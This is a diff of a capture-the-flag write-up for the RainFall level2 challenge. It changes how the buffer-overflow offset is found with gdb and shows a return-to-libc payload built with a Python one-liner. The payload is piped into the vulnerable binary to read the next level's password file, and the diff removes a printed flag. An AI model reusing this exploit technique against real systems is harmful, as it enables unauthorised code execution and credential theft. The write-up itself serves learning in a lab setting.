@@ -22,30 +22,36 @@ Next, we find the address of the ret instruction:
 ```
 0x804853e <p+106>:	ret
 ```
-We export the shell we want to use:
+We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
 ```
-$ export SHELL=/bin/sh
+level2@RainFall:~$ gdb ./level2 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
 ```
-Then, we write a small program to find the address of environment variables (available in ressoures).
+We find that the buffer size is 80
+
+Next, we need to construct the payload to exploit the vulnerability using the following format:
 ```
-$ gcc getenv.c -o getenv
-$ ./getenv SHELL
-SHELL is at 0xbffff935
+buffer + return address + system function address + fake return address + "/bin/sh" address from libc
 ```
-We need to determine the offset at which the buffer overflows:
 ```
-gdb> pattern create 100
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
-gdb> r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')
-gdb> pattern search
-Registers contain pattern buffer:
-EBP+0 found at offset: 76
-EIP+0 found at offset: 80
-```
-Now, we prepare the payload:
-```
-$ python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/payload2
+$ python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "4242" + "\x35\xf9\xff\xbf"' > /tmp/payload2
 $ cat /tmp/payload2 - | ./level2
 $ cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
